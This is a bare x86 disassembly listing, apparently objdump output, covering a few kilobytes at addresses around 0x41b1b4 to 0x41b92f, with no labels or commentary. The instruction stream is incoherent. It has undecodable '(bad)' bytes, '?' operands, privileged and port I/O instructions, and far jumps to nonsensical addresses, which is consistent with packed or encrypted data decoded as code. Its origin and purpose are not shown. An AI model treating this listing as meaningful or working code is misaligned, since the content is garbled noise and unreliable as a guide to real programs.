  41b1b4:	adc    al,0x11
  41b1b6:	adc    al,0x1b
  41b1b8:	jne    0x41b13c
  41b1ba:	pop    esp
  41b1bb:	push   ss
  41b1bc:	aaa    
  41b1bd:	fucomp st(7)
  41b1bf:	lods   al,BYTE PTR ds:[esi]
  41b1c0:	outs   dx,DWORD PTR ds:[esi]
  41b1c1:	loope  0x41b240
  41b1c3:	and    BYTE PTR [ecx+eax*4],dh
  41b1c6:	push   esp
  41b1c7:	jmp    0x41b1a8
  41b1c9:	sub    DWORD PTR [ebx-0x3a],ecx
  41b1cc:	lahf   
  41b1cd:	pop    es
  41b1ce:	mov    esi,0xaf6b65f5
  41b1d3:	mov    BYTE PTR [esi+ebp*2+0x62],0x73
  41b1d8:	lahf   
  41b1d9:	mov    BYTE PTR [esi+0x5f8de982],bh
  41b1df:	mov    eax,ds:0xef5fad7c
  41b1e4:	jmp    0x41b1c8
  41b1e6:	pop    ebx
  41b1e7:	mov    bh,0x76
  41b1e9:	clc    
  41b1ea:	dec    esp
  41b1eb:	push   edx
  41b1ec:	icebp  
  41b1ed:	xchg   esi,eax
  41b1ee:	jge    0x41b1c7
  41b1f0:	cmc    
  41b1f1:	mov    cl,0xba
  41b1f3:	ja     0x41b20f
  41b1f5:	or     eax,0x4af6e525
  41b1fa:	pop    eax
  41b1fb:	aas    
  41b1fc:	inc    esp
  41b1fd:	call   0x85d7d36a
  41b202:	inc    esi
  41b203:	scas   eax,DWORD PTR es:[edi]
  41b204:	or     esp,DWORD PTR [ebx]
  41b206:	js     0x41b284
  41b208:	pop    ecx
  41b209:	inc    ecx
  41b20a:	sbb    al,0x61
  41b20c:	arpl   WORD PTR [ebp+esi*8-0x11ab73f9],bx
  41b213:	inc    ebx
  41b214:	sahf   
  41b215:	sub    al,0x29
  41b217:	or     al,0x4d
  41b219:	stos   BYTE PTR es:[edi],al
  41b21a:	or     DWORD PTR [eax],0xffffff8c
  41b21d:	push   edi
  41b21e:	cld    
  41b21f:	data16 aaa 
  41b221:	std    
  41b222:	lea    edi,[ecx+edi*4+0x73]
  41b226:	xchg   BYTE PTR [ebx-0x53e10f73],cl
  41b22c:	addr16 je 0x41b231
  41b22f:	ds mov al,0xc2
  41b232:	xchg   ebp,ebx
  41b234:	fnstsw WORD PTR [ecx+0x1a]
  41b237:	aad    0xf1
  41b239:	sti    
  41b23a:	ret    
  41b23b:	and    eax,0xe3d7d271
  41b240:	and    eax,0xd304aa80
  41b245:	xor    eax,0x9385d81d
  41b24a:	repz repz sub edi,DWORD PTR [eax+0x54]
  41b24f:	outs   dx,DWORD PTR ds:[esi]
  41b250:	xchg   ch,cl
  41b252:	mov    dh,0x7a
  41b254:	into   
  41b255:	mov    dh,0xf7
  41b257:	xor    DWORD PTR [ecx],eax
  41b259:	mov    edi,0xe30751e6
  41b25e:	fsubr  DWORD PTR [ebp+eiz*2+0x44e0402b]
  41b265:	mov    dl,0x54
  41b267:	push   cs
  41b268:	in     eax,dx
  41b269:	loop   0x41b296
  41b26b:	jmp    0x81daf36
  41b270:	or     al,BYTE PTR [edx-0x61fa810c]
  41b276:	shr    BYTE PTR [esi-0x1e],1
  41b279:	loop   0x41b250
  41b27b:	stos   BYTE PTR es:[edi],al
  41b27c:	iret   
  41b27d:	test   DWORD PTR [edx],0x91df843
  41b283:	in     al,dx
  41b284:	and    DWORD PTR ss:[edx+0x52e2f149],0x8e7f8ccb
  41b28f:	cdq    
  41b290:	cmp    bl,BYTE PTR [esi]
  41b292:	(bad)  
  41b294:	in     al,dx
  41b295:	and    BYTE PTR ds:0xf2d2e58c,dh
  41b29b:	and    ah,BYTE PTR [edi+0x69fab68e]
  41b2a1:	and    al,0xe5
  41b2a3:	jecxz  0x41b2b4
  41b2a5:	xchg   ebx,eax
  41b2a6:	xchg   DWORD PTR [edi],edi
  41b2a8:	xchg   ebx,eax
  41b2a9:	test   DWORD PTR [ecx-0x33243176],ebp
  41b2af:	cmp    BYTE PTR [edi-0x65],0xc3
  41b2b3:	jne    0x41b274
  41b2b5:	inc    ebx
  41b2b6:	stos   DWORD PTR es:[edi],eax
  41b2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b8:	sbb    dh,BYTE PTR ds:0xa298844d
  41b2be:	lds    esi,FWORD PTR [edi+0x36]
  41b2c1:	and    BYTE PTR [edx+0x24],ah
  41b2c4:	fiadd  WORD PTR [eax-0x1e]
  41b2c7:	dec    edi
  41b2c8:	je     0x41b31f
  41b2ca:	xchg   bh,dh
  41b2cc:	lahf   
  41b2cd:	rcr    DWORD PTR [ebp-0x27],0x27
  41b2d1:	pop    ebx
  41b2d2:	push   eax
  41b2d3:	jo     0x41b2e5
  41b2d5:	dec    ebx
  41b2d6:	in     al,dx
  41b2d7:	int    0x8f
  41b2d9:	and    al,0x6
  41b2db:	or     DWORD PTR [ebp-0x21],esp
  41b2de:	test   eax,0xcae5b593
  41b2e3:	imul   ecx,DWORD PTR gs:[eax-0x6],0xffffffc3
  41b2e8:	dec    eax
  41b2e9:	jbe    0x41b2fa
  41b2eb:	and    dh,BYTE PTR [eax]
  41b2ed:	jl     0x41b317
  41b2ef:	add    BYTE PTR [eax+0x9d63d1e],dh
  41b2f5:	sub    DWORD PTR [esi],esi
  41b2f7:	mov    ebp,edx
  41b2f9:	mov    edi,0xc7c92795
  41b2fe:	push   esi
  41b2ff:	sub    eax,0x7de3b7f7
  41b304:	pop    ss
  41b305:	sub    dl,BYTE PTR [ebx]
  41b307:	jne    0x41b387
  41b309:	or     DWORD PTR [esi+0x54],edx
  41b30c:	inc    esp
  41b30d:	pop    ss
  41b30e:	mov    ah,0x28
  41b310:	lds    ecx,FWORD PTR [ebx+0x26]
  41b313:	and    eax,0x61b0f4b
  41b318:	ins    BYTE PTR es:[edi],dx
  41b319:	icebp  
  41b31a:	add    ah,BYTE PTR [ecx-0x5d]
  41b31d:	pop    ebp
  41b31e:	icebp  
  41b31f:	push   eax
  41b320:	outs   dx,DWORD PTR ds:[esi]
  41b321:	or     DWORD PTR [edi+0x73],edi
  41b324:	in     al,0x50
  41b326:	stos   BYTE PTR es:[edi],al
  41b327:	xchg   edi,eax
  41b328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b329:	sub    al,0xf6
  41b32b:	mov    esp,0x5c4383e1
  41b330:	ds retf 0x4937
  41b334:	popf   
  41b335:	push   0x39d3c210
  41b33a:	xlat   BYTE PTR ds:[ebx]
  41b33b:	cmc    
  41b33c:	stos   DWORD PTR es:[edi],eax
  41b33d:	jmp    0x521a:0xcab2b4db
  41b344:	mov    ebx,0x46141ef8
  41b349:	push   cs
  41b34a:	rcl    DWORD PTR [edx+0xce6126c],0x43
  41b351:	int3   
  41b352:	ins    DWORD PTR es:[edi],dx
  41b353:	aas    
  41b354:	rol    edx,cl
  41b356:	dec    eax
  41b357:	adc    DWORD PTR [eax],edx
  41b359:	lock in al,dx
  41b35b:	mov    ecx,0xf11c9729
  41b360:	test   dh,ah
  41b362:	mov    eax,ds:0x9e67ad6a
  41b367:	out    dx,eax
  41b368:	add    dh,BYTE PTR [esi]
  41b36a:	push   ecx
  41b36b:	call   0x4f7:0x5703bce2
  41b372:	and    BYTE PTR [ebx-0xe693c38],cl
  41b378:	inc    esi
  41b379:	pop    ds
  41b37a:	push   ebp
  41b37b:	stos   BYTE PTR es:[edi],al
  41b37c:	imul   ecx,DWORD PTR [ebp+0x3e],0xffffffcf
  41b380:	(bad)  
  41b381:	xor    eax,0xc57b1fe7
  41b386:	stc    
  41b387:	loopne 0x41b3dd
  41b389:	or     dh,al
  41b38b:	add    cl,bl
  41b38d:	jle    0x41b408
  41b38f:	pop    ecx
  41b390:	out    0x52,al
  41b392:	xlat   BYTE PTR ds:[ebx]
  41b393:	xor    al,0xef
  41b395:	push   ds
  41b396:	shl    BYTE PTR [edx+0x14b16c54],1
  41b39c:	xchg   dh,dl
  41b39e:	sub    BYTE PTR [edi+0x3c0d72e9],dl
  41b3a4:	jge    0x41b3a9
  41b3a6:	ins    BYTE PTR es:[edi],dx
  41b3a7:	data16 xor BYTE PTR [edx+0x35ea16fc],bh
  41b3ae:	std    
  41b3af:	dec    ebp
  41b3b0:	sub    ah,BYTE PTR [esi]
  41b3b2:	lahf   
  41b3b3:	in     eax,0xb6
  41b3b5:	jns    0x41b410
  41b3b7:	loopne 0x41b36d
  41b3b9:	adc    BYTE PTR [ebp+0x16307f],ah
  41b3bf:	scas   eax,DWORD PTR es:[edi]
  41b3c0:	push   0x6e
  41b3c2:	add    al,0xc6
  41b3c4:	mov    BYTE PTR [esi-0x20c76831],ah
  41b3ca:	pop    ecx
  41b3cb:	addr16 push es
  41b3cd:	je     0x41b3f3
  41b3cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3d0:	xchg   esp,eax
  41b3d1:	mov    cl,0x86
  41b3d3:	dec    eax
  41b3d4:	xor    ebx,esp
  41b3d6:	(bad)
  41b3d9:	mov    bl,0xd9
  41b3db:	mov    ds:0x37b42b18,eax
  41b3e0:	jb     0x41b39a
  41b3e2:	pop    eax
  41b3e3:	xchg   ebx,eax
  41b3e4:	mov    al,ds:0x3b4265d9
  41b3e9:	pop    edx
  41b3ea:	loop   0x41b444
  41b3ec:	pop    edi
  41b3ed:	pop    es
  41b3ee:	outs   dx,BYTE PTR ds:[esi]
  41b3ef:	(bad)  
  41b3f0:	sar    ah,cl
  41b3f2:	and    ebx,DWORD PTR [edi+0x42bfa497]
  41b3f8:	test   eax,0x8a661cdb
  41b3fd:	ror    cl,0x5d
  41b400:	icebp  
  41b401:	mov    bh,0xbe
  41b403:	dec    esp
  41b404:	push   ecx
  41b405:	sub    bl,ah
  41b407:	mov    dl,0xe1
  41b409:	mov    dl,0x3e
  41b40b:	fdiv   QWORD PTR [esi-0x6d6075ef]
  41b411:	or     BYTE PTR [esi],dl
  41b413:	test   dl,ch
  41b415:	jae    0x41b3cc
  41b417:	in     al,0x29
  41b419:	dec    eax
  41b41a:	popf   
  41b41b:	or     DWORD PTR [eax],edi
  41b41d:	ins    BYTE PTR es:[edi],dx
  41b41e:	xchg   esi,eax
  41b41f:	scas   al,BYTE PTR es:[edi]
  41b420:	xchg   esi,eax
  41b421:	sbb    ebx,edx
  41b423:	lahf   
  41b424:	inc    esp
  41b425:	ja     0x41b3d5
  41b427:	jns    0x41b468
  41b429:	adc    BYTE PTR [eax],dh
  41b42b:	jmp    0x4e8b:0x52f2fbf0
  41b432:	fadd   QWORD PTR [edi+0x5df3aeb9]
  41b438:	sar    BYTE PTR [esi],0x63
  41b43b:	dec    BYTE PTR [eax]
  41b43d:	xor    ecx,eax
  41b43f:	hlt    
  41b440:	adc    dh,al
  41b442:	ror    BYTE PTR [edi-0x58],1
  41b445:	mov    esi,0x3b8f65c5
  41b44a:	push   ebx
  41b44b:	fmul   QWORD PTR [ebx]
  41b44d:	inc    eax
  41b44e:	cmp    al,0xff
  41b450:	inc    ebp
  41b451:	pusha  
  41b452:	call   0xfa82f1ec
  41b457:	inc    ebx
  41b458:	aas    
  41b459:	sbb    eax,0x776dff92
  41b45e:	fdivr  DWORD PTR ds:0xe32f73fc
  41b464:	or     DWORD PTR [eax-0x65],ebp
  41b467:	mov    DWORD PTR [edi+eax*8-0x34],0xde8418ab
  41b46f:	xchg   esp,eax
  41b470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b471:	cli    
  41b472:	int3   
  41b473:	rol    BYTE PTR [ebx+eiz*8-0x4f],cl
  41b477:	jl     0x41b451
  41b479:	fcmovnbe st,st(1)
  41b47b:	adc    eax,0xa0061699
  41b480:	mov    eax,0x3d2fb419
  41b485:	adc    BYTE PTR [ecx-0x6f0b4be0],dh
  41b48b:	pop    ds
  41b48c:	xchg   BYTE PTR [ebx+0x5301f52c],al
  41b492:	jo     0x41b4af
  41b494:	xor    eax,0x5729b272
  41b499:	jmp    0xefee:0x3b1c66c4
  41b4a0:	sbb    ebx,ecx
  41b4a2:	adc    BYTE PTR [esi-0x57f90aa8],al
  41b4a8:	mov    esi,ecx
  41b4aa:	lods   eax,DWORD PTR ds:[esi]
  41b4ab:	and    eax,0xf2618fb0
  41b4b0:	cdq    
  41b4b1:	xor    BYTE PTR [eax],bl
  41b4b3:	inc    ebp
  41b4b4:	or     ah,BYTE PTR [esi]
  41b4b6:	xchg   esi,eax
  41b4b7:	out    0x0,eax
  41b4b9:	jp     0x41b461
  41b4bb:	enter  0x22b5,0xfc
  41b4bf:	cmp    cl,BYTE PTR [ebx]
  41b4c1:	xchg   DWORD PTR [edx],eax
  41b4c3:	or     eax,DWORD PTR [ebx+edx*2]
  41b4c6:	mov    ebx,0x4870b425
  41b4cb:	int3   
  41b4cc:	adc    BYTE PTR [ecx-0x38f6f011],ah
  41b4d2:	test   eax,0x39d6f28f
  41b4d7:	sti    
  41b4d8:	(bad)  [esi+edi*4+0x1a54c641]
  41b4df:	push   eax
  41b4e0:	test   DWORD PTR ss:[edi-0x1d],edx
  41b4e4:	not    DWORD PTR [esi+0x5521f1df]
  41b4ea:	clc    
  41b4eb:	sbb    DWORD PTR [edi-0x20],0x6d
  41b4ef:	mov    esp,0x4df96b01
  41b4f4:	push   0xffffff8c
  41b4f6:	lods   al,BYTE PTR ds:[esi]
  41b4f7:	cmp    al,0xdf
  41b4f9:	rol    cl,1
  41b4fb:	ror    DWORD PTR [ecx+0x64],1
  41b4fe:	xchg   esi,eax
  41b4ff:	sub    BYTE PTR [eax+0x59975060],ch
  41b505:	pop    ebx
  41b506:	inc    esp
  41b507:	(bad)  
  41b508:	cli    
  41b509:	cdq    
  41b50a:	xchg   esp,eax
  41b50b:	bound  ebp,QWORD PTR [edi+0x4186ebad]
  41b511:	add    al,BYTE PTR [esi+ebx*1-0xa4061bb]
  41b518:	(bad)  
  41b519:	lahf   
  41b51a:	mov    DWORD PTR [edi],ecx
  41b51c:	lea    eax,[edi-0x7f1a42c9]
  41b522:	and    ecx,DWORD PTR [edi]
  41b524:	fidivr DWORD PTR [esp+ebp*4-0x44]
  41b528:	xchg   BYTE PTR [ebx-0x78],cl
  41b52b:	add    BYTE PTR [ebx+0x6bd39a19],dh
  41b531:	and    DWORD PTR [ebp+0x6ed37fe4],edx
  41b537:	inc    ebx
  41b538:	test   edx,0xc6c3c026
  41b53e:	cmp    ebp,DWORD PTR [edx+eax*1]
  41b541:	sbb    ecx,DWORD PTR [ecx-0x4533124b]
  41b547:	out    dx,eax
  41b548:	xor    DWORD PTR gs:[ebp-0x3ebedc21],ebx
  41b54f:	mov    bh,0x72
  41b551:	push   eax
  41b552:	xor    al,0xb7
  41b554:	pop    ebx
  41b555:	mov    al,0x22
  41b557:	fwait
  41b558:	ret    0x1a6a
  41b55b:	add    esp,DWORD PTR [edi+0x587060df]
  41b561:	mov    ?,WORD PTR [eax]
  41b563:	fwait
  41b564:	push   esi
  41b565:	lods   al,BYTE PTR ds:[esi]
  41b566:	sahf   
  41b567:	lds    ebx,FWORD PTR [ecx]
  41b569:	push   es
  41b56a:	cmc    
  41b56b:	xor    eax,0xc6f3741e
  41b570:	inc    ebx
  41b571:	inc    edi
  41b572:	in     al,0xf5
  41b574:	icebp  
  41b575:	je     0x41b50d
  41b577:	outs   dx,BYTE PTR ds:[esi]
  41b578:	pop    ds
  41b579:	xchg   edx,eax
  41b57a:	adc    dl,BYTE PTR [ecx]
  41b57c:	es cwde 
  41b57e:	scas   al,BYTE PTR es:[edi]
  41b57f:	xchg   ebx,eax
  41b580:	ret    
  41b581:	rcl    bl,1
  41b583:	cwde   
  41b584:	sbb    al,0x82
  41b586:	mov    ch,0x7e
  41b588:	in     eax,dx
  41b589:	cs pop ecx
  41b58b:	scas   al,BYTE PTR es:[edi]
  41b58c:	mov    ah,0x4b
  41b58e:	mov    BYTE PTR [edx-0x62f8a67a],bh
  41b594:	xor    al,0x92
  41b596:	push   ds
  41b597:	out    0xa,al
  41b599:	mov    ecx,0x7d4cae78
  41b59e:	je     0x41b5d1
  41b5a0:	push   esp
  41b5a1:	cmp    esi,ebp
  41b5a3:	mov    dl,0x93
  41b5a5:	mov    bh,0x72
  41b5a7:	lahf   
  41b5a8:	inc    ebp
  41b5a9:	es retf 
  41b5ab:	gs pop edi
  41b5ad:	test   DWORD PTR [ecx+eax*8-0x65],edx
  41b5b1:	les    edx,FWORD PTR ds:0x33d055f1
  41b5b7:	out    dx,al
  41b5b8:	jp     0x41b629
  41b5ba:	mov    eax,0x8cc1c35e
  41b5bf:	add    DWORD PTR [ecx],edi
  41b5c1:	adc    esi,ebp
  41b5c3:	pop    es
  41b5c4:	inc    ebx
  41b5c5:	sar    DWORD PTR [edx],cl
  41b5c7:	pop    ebx
  41b5c8:	pop    edx
  41b5c9:	(bad)  
  41b5ca:	adc    eax,0x6611e56e
  41b5cf:	mov    ah,0xf5
  41b5d1:	add    dh,bl
  41b5d3:	call   0x41dfb1
  41b5d8:	jmp    0x41ba21
  41b5dd:	push   cs
  41b5de:	adc    BYTE PTR [esi+edi*8+0x58],0xd3
  41b5e3:	fs xor ch,0xf0
  41b5e7:	and    al,0x68
  41b5e9:	adc    BYTE PTR [ebp+0xd2d68e2],0xc
  41b5f0:	push   ss
  41b5f1:	(bad)  
  41b5f2:	push   cs
  41b5f3:	push   ss
  41b5f4:	push   ss
  41b5f5:	add    edi,DWORD PTR ds:0x9b461492
  41b5fb:	xor    cl,bl
  41b5fd:	adc    al,0x7f
  41b5ff:	add    BYTE PTR [ebp-0x44],cl
  41b602:	xchg   ecx,eax
  41b603:	mov    edx,0x72de94f5
  41b608:	mov    edi,0x6fdb3fb7
  41b60d:	inc    ebp
  41b60e:	or     cl,BYTE PTR [ebx+0x52]
  41b611:	cs ds pop edx
  41b614:	jns    0x41b5f2
  41b616:	imul   edx,DWORD PTR [ebp+0x45],0x22315632
  41b61d:	retf   0x6b95
  41b620:	jge    0x41b5c4
  41b622:	std    
  41b623:	pop    esi
  41b624:	stos   BYTE PTR es:[edi],al
  41b625:	sub    ebx,DWORD PTR [ebp-0x4f]
  41b628:	jecxz  0x41b5cd
  41b62a:	fucom  st(3)
  41b62c:	add    BYTE PTR [ebp-0x20],0xf0
  41b630:	mov    al,ch
  41b632:	cmc    
  41b633:	outs   dx,DWORD PTR ds:[esi]
  41b634:	jmp    0xd3ffbc9
  41b639:	push   ecx
  41b63a:	out    0x4d,eax
  41b63c:	fiadd  DWORD PTR [ebx+0x3fd0d8a5]
  41b642:	xor    DWORD PTR [eax-0x21113ed6],ecx
  41b648:	clc    
  41b649:	dec    ebp
  41b64a:	enter  0xf02f,0x1b
  41b64e:	add    DWORD PTR [ebx+esi*4-0x72],0x62345d3e
  41b656:	scas   eax,DWORD PTR es:[edi]
  41b657:	pop    esi
  41b658:	imul   ebx,DWORD PTR [ebp+ebx*1+0x0],0x82667db8
  41b660:	ret    
  41b661:	les    ebx,FWORD PTR [ebx+0x16]
  41b664:	jbe    0x41b5ff
  41b666:	xor    ecx,esp
  41b668:	mov    dh,0xf
  41b66a:	pop    edx
  41b66b:	xor    ch,BYTE PTR [eax+0x7f15b66d]
  41b671:	add    DWORD PTR [esi+0x3c2d653b],ebx
  41b677:	xchg   edi,eax
  41b678:	push   0xfd880e36
  41b67d:	cmp    BYTE PTR [ebp-0x68],0x20
  41b681:	(bad)  
  41b682:	(bad)  
  41b683:	retf   0x6172
  41b686:	jae    0x41b628
  41b688:	sub    eax,0xcd205c0c
  41b68d:	sbb    bl,0xfb
  41b690:	loope  0x41b6e0
  41b692:	stc    
  41b693:	(bad)  
  41b694:	xchg   ebp,eax
  41b695:	mov    DWORD PTR [edx-0x2],ecx
  41b698:	das    
  41b699:	mov    eax,0xf80578a3
  41b69e:	mov    WORD PTR [ecx+0x4c32b178],ss
  41b6a4:	addr16 shr esp,1
  41b6a7:	jecxz  0x41b6b1
  41b6a9:	mov    esp,0x4939da3d
  41b6ae:	call   0x5d5b:0xd48b2d97
  41b6b5:	popa   
  41b6b6:	repnz int3 
  41b6b8:	cmp    BYTE PTR ds:0x69296680,cl
  41b6be:	aaa    
  41b6bf:	dec    ebx
  41b6c0:	ror    dh,1
  41b6c2:	inc    esp
  41b6c3:	cs (bad) 
  41b6c6:	pop    edi
  41b6c7:	cmp    al,0x9f
  41b6c9:	add    al,0xe0
  41b6cb:	lahf   
  41b6cc:	xchg   ebx,eax
  41b6cd:	and    BYTE PTR [esi+0x5d70a580],0x31
  41b6d4:	lea    esp,[esi+0x2c]
  41b6d7:	push   eax
  41b6d8:	stos   DWORD PTR es:[edi],eax
  41b6d9:	or     bl,BYTE PTR [ecx-0x2c81e1f0]
  41b6df:	icebp  
  41b6e0:	add    eax,0xd799d66f
  41b6e5:	ret    0x27f5
  41b6e8:	mov    bh,0x52
  41b6ea:	cmp    ah,BYTE PTR [esi+0x6a58bb14]
  41b6f0:	shl    DWORD PTR [ebx-0xe],cl
  41b6f3:	adc    DWORD PTR [ecx+0x166c66cd],ebp
  41b6f9:	jmp    0x1c63ebb1
  41b6fe:	xchg   ecx,eax
  41b6ff:	xchg   edi,eax
  41b700:	je     0x41b761
  41b702:	leave  
  41b703:	mov    edx,0xdcd38808
  41b708:	lock mov ah,0x49
  41b70b:	xchg   ebp,eax
  41b70c:	es icebp 
  41b70e:	jnp    0x41b6a1
  41b710:	leave  
  41b711:	sahf   
  41b712:	dec    ebx
  41b713:	ins    DWORD PTR es:[edi],dx
  41b714:	adc    esi,DWORD PTR [eax+esi*4+0x73]
  41b718:	dec    edi
  41b719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b71a:	push   DWORD PTR [edi+0x2176c261]
  41b720:	mov    ds:0x66b62fc,eax
  41b725:	in     eax,dx
  41b726:	dec    edi
  41b727:	jno    0x41b6d5
  41b729:	sbb    BYTE PTR [edi],cl
  41b72b:	push   0x7f
  41b72d:	jge    0x41b766
  41b72f:	adc    eax,0xc89df923
  41b734:	lahf   
  41b735:	outs   dx,DWORD PTR ds:[esi]
  41b736:	and    BYTE PTR [eax+0x59],al
  41b739:	ret    0x1a42
  41b73c:	mov    dh,0x73
  41b73e:	mov    edi,0x915490ec
  41b743:	sbb    bh,ch
  41b745:	cs xor al,0x66
  41b748:	xchg   ebx,eax
  41b749:	in     al,dx
  41b74a:	inc    ecx
  41b74b:	add    al,0x6f
  41b74d:	push   cs
  41b74e:	push   cs
  41b74f:	pop    gs
  41b751:	pop    edi
  41b752:	ja     0x41b734
  41b754:	jmp    0xf323f58c
  41b759:	push   esp
  41b75a:	scas   eax,DWORD PTR es:[edi]
  41b75b:	(bad)  
  41b75d:	fimul  DWORD PTR [edx+ebx*2+0xa]
  41b761:	push   edi
  41b762:	inc    eax
  41b763:	shr    bh,1
  41b765:	cmp    ebx,ebx
  41b767:	rol    BYTE PTR [ebx-0x73a6ee63],0x24
  41b76e:	test   bl,ah
  41b770:	and    al,0x1d
  41b772:	stos   BYTE PTR es:[edi],al
  41b773:	loope  0x41b750
  41b775:	ror    ebp,1
  41b777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b778:	mov    ebp,0x52f2d121
  41b77d:	(bad)  
  41b77e:	cmc    
  41b77f:	and    BYTE PTR [ebx],0xcc
  41b782:	fisttp DWORD PTR [ecx-0x58]
  41b785:	imul   edx,edi,0xc37e82c9
  41b78b:	(bad)  [edx+0x8dfa35a]
  41b791:	pop    edi
  41b792:	or     DWORD PTR [edx],ecx
  41b794:	call   DWORD PTR [edi-0x2f]
  41b797:	(bad)  
  41b798:	neg    DWORD PTR [eax+0x2]
  41b79b:	xchg   ebx,eax
  41b79c:	jp     0x41b752
  41b79e:	imul   cl
  41b7a0:	jmp    0xce5d:0x8e24fdad
  41b7a7:	test   esi,ebx
  41b7a9:	and    dl,0xee
  41b7ac:	mov    ecx,0x3647b8d4
  41b7b1:	outs   dx,BYTE PTR ds:[esi]
  41b7b2:	xor    edi,eax
  41b7b4:	lds    esi,FWORD PTR [ebx+0x7d29080b]
  41b7ba:	aaa    
  41b7bb:	sub    al,0x55
  41b7bd:	xchg   esp,eax
  41b7be:	fidivr WORD PTR [ecx-0x58]
  41b7c1:	mov    ebx,?
  41b7c3:	call   0xff28:0x69d1054e
  41b7ca:	pop    esp
  41b7cb:	retf   0x5015
  41b7ce:	les    edx,FWORD PTR [ecx-0x1915b403]
  41b7d4:	js     0x41b7cb
  41b7d6:	push   edx
  41b7d7:	push   esp
  41b7d8:	xor    BYTE PTR [esi+edx*1],dh
  41b7db:	xchg   edi,eax
  41b7dc:	int3   
  41b7dd:	lods   eax,DWORD PTR ds:[esi]
  41b7de:	and    ch,BYTE PTR [ecx]
  41b7e0:	mov    ah,0x75
  41b7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e3:	ja     0x41b7d3
  41b7e5:	mov    bh,0x91
  41b7e7:	cdq    
  41b7e8:	mov    DWORD PTR [edi+0x71aad163],ebx
  41b7ee:	cmp    al,0xbd
  41b7f0:	inc    ebx
  41b7f1:	pusha  
  41b7f2:	push   ebp
  41b7f3:	xor    ch,BYTE PTR ds:0x6a945bb8
  41b7f9:	pop    esi
  41b7fa:	sub    ah,BYTE PTR [edi+ebp*8-0x45b80e7f]
  41b801:	scas   al,BYTE PTR es:[edi]
  41b802:	retf   
  41b803:	in     al,0x1a
  41b805:	stc    
  41b806:	pop    esi
  41b807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b808:	mov    ds:0x339376b6,al
  41b80d:	pop    es
  41b80e:	sbb    BYTE PTR ds:0xcc2d7087,dl
  41b814:	xor    eax,0x5b51b1a6
  41b819:	out    0xb,al
  41b81b:	pop    eax
  41b81c:	fdiv   QWORD PTR [ecx-0x7b]
  41b81f:	dec    ebp
  41b820:	sbb    cl,al
  41b822:	fisttp WORD PTR [ecx-0xf1b0d0d]
  41b828:	dec    esi
  41b829:	push   0x5
  41b82b:	setae  BYTE PTR [ecx-0x59]
  41b82f:	pop    es
  41b830:	out    0x72,al
  41b832:	and    al,0x12
  41b834:	xlat   BYTE PTR ds:[ebx]
  41b835:	push   esp
  41b836:	loop   0x41b84b
  41b838:	imul   edx,DWORD PTR [ebx*1-0x2c5d0981],0x78
  41b840:	jge    0x41b83b
  41b842:	sbb    DWORD PTR [esi-0x132cc0b3],edi
  41b848:	adc    ah,BYTE PTR [esp+ebp*1+0x6a5f22f9]
  41b84f:	dec    ecx
  41b850:	xlat   BYTE PTR ds:[ebx]
  41b851:	cmp    bh,BYTE PTR [esi+0x4a]
  41b854:	mov    eax,ds:0xe2a1590
  41b859:	neg    BYTE PTR [edx-0x61]
  41b85c:	aad    0x3
  41b85e:	dec    ebp
  41b85f:	lods   eax,DWORD PTR ds:[esi]
  41b860:	aaa    
  41b861:	int    0x49
  41b863:	sbb    edx,DWORD PTR [eax]
  41b865:	jg     0x41b890
  41b867:	mov    dh,0x48
  41b869:	jne    0x41b8d0
  41b86b:	push   esp
  41b86c:	sub    eax,0xea669890
  41b871:	or     al,0x1f
  41b873:	inc    ecx
  41b874:	test   esp,esi
  41b876:	rcl    DWORD PTR [edx+0x74],0x64
  41b87a:	or     BYTE PTR [edx],ah
  41b87c:	jmp    0xaf6c:0xc27f8622
  41b883:	ins    BYTE PTR es:[edi],dx
  41b884:	into   
  41b885:	ja     0x41b81e
  41b887:	and    BYTE PTR [esi-0x5fdb3b2b],dl
  41b88d:	mov    esp,0x734d7615
  41b892:	aad    0xb0
  41b894:	inc    ebp
  41b895:	add    DWORD PTR [edx+0x122d8f17],edi
  41b89b:	xor    eax,0x99c33db5
  41b8a0:	cmp    DWORD PTR [edi+0x78],esp
  41b8a3:	mov    ebp,0xbf66f146
  41b8a8:	pop    esp
  41b8a9:	pop    ds
  41b8aa:	mov    dh,0x51
  41b8ac:	push   esp
  41b8ad:	and    al,0x5c
  41b8af:	inc    edx
  41b8b0:	enter  0xb109,0x78
  41b8b4:	or     ebx,edx
  41b8b6:	mov    bl,0x48
  41b8b8:	mov    ecx,0x2f145ae1
  41b8bd:	add    BYTE PTR [edx],cl
  41b8bf:	pop    edi
  41b8c0:	or     ecx,esp
  41b8c2:	jae    0x41b8df
  41b8c4:	shl    DWORD PTR es:[esi+ecx*2-0x43],1
  41b8c9:	mov    ebx,0xab688a3f
  41b8ce:	and    eax,0xa29fb435
  41b8d3:	clc    
  41b8d4:	or     BYTE PTR [edi-0x5550c6eb],dl
  41b8da:	loopne 0x41b876
  41b8dc:	sub    eax,0x243e75fd
  41b8e1:	pop    edx
  41b8e2:	mov    ds,edi
  41b8e4:	(bad)  
  41b8e5:	mov    ebx,0x8f18905d
  41b8ea:	cwde   
  41b8eb:	jb     0x41b924
  41b8ed:	aaa    
  41b8ee:	fsub   st,st(5)
  41b8f0:	mov    eax,ds:0x15eae8eb
  41b8f5:	or     BYTE PTR [edx+ebx*4-0x1f0ce89],al
  41b8fc:	popa   
  41b8fd:	xchg   esp,eax
  41b8fe:	dec    edi
  41b8ff:	outs   dx,BYTE PTR ds:[esi]
  41b900:	call   0xc643:0xfe18ce07
  41b907:	sub    ah,BYTE PTR [ebp+0x156efad5]
  41b90d:	pushf  
  41b90e:	jmpw   0xec18
  41b912:	and    DWORD PTR [ebx+0x7c98d6e5],ebx
  41b918:	lds    esp,FWORD PTR [esi]
  41b91a:	xchg   edi,eax
  41b91b:	in     al,0x24
  41b91d:	gs stos DWORD PTR es:[edi],eax
  41b91f:	ret    0x46c
  41b922:	xor    DWORD PTR [esi],ebx
  41b924:	and    esp,DWORD PTR [ebp-0x7457295f]
  41b92a:	in     al,0x6e
  41b92c:	lods   al,BYTE PTR ds:[esi]
  41b92d:	mov    ah,0xc8
  41b92f:	push   0x9ec394e1
